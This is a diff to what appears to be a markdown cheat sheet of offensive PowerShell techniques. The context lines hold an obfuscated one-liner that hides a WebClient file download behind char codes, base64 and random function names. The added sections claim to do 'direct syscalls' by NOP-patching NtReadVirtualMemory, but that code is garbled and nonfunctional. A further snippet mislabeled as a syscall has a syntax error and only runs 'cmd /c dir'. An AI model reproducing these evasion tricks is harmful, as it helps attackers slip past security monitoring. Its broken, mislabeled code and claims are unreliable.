@@ -105,3 +105,28 @@ $outputFile = 'install.ps1'
 &{param($x)${function:l}=-join (65..90+97..122|%{[char]$_}|Get-Random -Count $x)};${function:($(l 4))}=&{param($u,$f)${function:($(l 6))}=&{param($x)return[char[]]$x-join''};${function:($(l 6))}=','+[char]39+${function:($(l 6))}(68,111,119,110,108,111,97,100,70,105,108,101)+[char]39+'('+$u+','+$f+')';${function:($(l 6))}=([text.encoding]::ASCII).GetString([Convert]::FromBase64String('V2ViQ2xpZW50'))+$(l 2);${function:($(l 6))}='['+$(l 1)+']('+$(l 6)+')';${function:($(l 6))}=(([char]96)+'c='+[type]('System.Net.'+${function:($(l 6))})).FullName);${function:($(l 6))}=$($(l 1)+[char]58+${function:($(l 6))})::new();${function:($(l 6))}.Invoke(${function:($(l 6))},(${function:($(l 6))}($u,$f)))};&($(l 4)) 'https://chocolatey.org/install.ps1' 'install.ps1'
 
 ```
+
+
+### direct syscalls by importing an assembly . Built assembly. replace the first 5 bytes of NtReadVirtualMemory
+```powershell
+# Import the assembly
+[Reflection.Assembly]::LoadFile("C:\Path\To\Assembly.dll")
+
+# Replace the first 5 bytes of NtReadVirtualMemory
+[System.Runtime.InteropServices.Marshal]::Copy([System.Text.Encoding]::ASCII.GetBytes("\x90\x90\x90\x90\x90"), 0, [System.IntPtr]::Add([System.IntPtr]::Zero, [System.IntPtr]::Size * 0x7FFE0030), 5)
+```
+
+### Something also syscall
+```powershell
+Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Process")
+
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = "cmd.exe"
+$process.StartInfo.Arguments = "/c dir"
+$process.StartInfo.UseShellExecute = $false
+$process.StartInfo.RedirectStandardOutput = $true
+$process.Start()
+$output = $process.StandardOutput.ReadToEnd()
+$process.WaitForExit()
+Write-Host $output
+```
